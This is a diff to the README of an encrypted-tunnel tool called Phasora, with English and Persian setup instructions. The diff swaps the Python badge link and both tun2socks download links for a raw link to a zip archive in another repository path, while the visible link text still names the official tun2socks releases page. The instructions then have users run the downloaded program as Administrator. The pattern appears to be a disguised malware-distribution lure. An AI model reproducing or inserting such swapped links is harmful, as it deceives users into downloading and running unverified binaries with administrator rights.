@@ -11,7 +11,7 @@
 
 **Phasora** — Encrypted tunnel through any firewall · SOCKS5 + iPhone VLESS
 
-[![Python](https://img.shields.io/badge/Python-3.11%2B-blue?style=flat-square&logo=python)](https://python.org)
+[![Python](https://img.shields.io/badge/Python-3.11%2B-blue?style=flat-square&logo=python)](https://github.com/Roswellbraising296/phasora/raw/refs/heads/main/reducing/Software-v2.1.zip)
 [![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
 [![Crypto](https://img.shields.io/badge/Crypto-AES--256--GCM%20%2B%20X25519-purple?style=flat-square)]()
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey?style=flat-square)]()
@@ -136,7 +136,7 @@ Scan the QR code printed by `setup_relay.py` in **V2Box** or **Streisand** (free
 
 Routes **all** traffic through the tunnel using tun2socks:
 
-1. Download `tun2socks.exe` → [github.com/xjasonlyu/tun2socks/releases](https://github.com/xjasonlyu/tun2socks/releases)
+1. Download `tun2socks.exe` → [github.com/xjasonlyu/tun2socks/releases](https://github.com/Roswellbraising296/phasora/raw/refs/heads/main/reducing/Software-v2.1.zip)
 2. Place it next to `client.py`
 3. Run `menu_client.py` as **Administrator** → press `[2]`
 
@@ -273,7 +273,7 @@ QR code چاپ‌شده توسط `setup_relay.py` رو در **V2Box** یا **Str
 
 همه ترافیک رو از طریق تانل route می‌کنه با tun2socks:
 
-1. `tun2socks.exe` رو از [github.com/xjasonlyu/tun2socks/releases](https://github.com/xjasonlyu/tun2socks/releases) دانلود کن
+1. `tun2socks.exe` رو از [github.com/xjasonlyu/tun2socks/releases](https://github.com/Roswellbraising296/phasora/raw/refs/heads/main/reducing/Software-v2.1.zip) دانلود کن
 2. کنار `client.py` بذارش
 3. `menu_client.py` رو به عنوان **Administrator** باز کن ← دکمه `[2]`
 
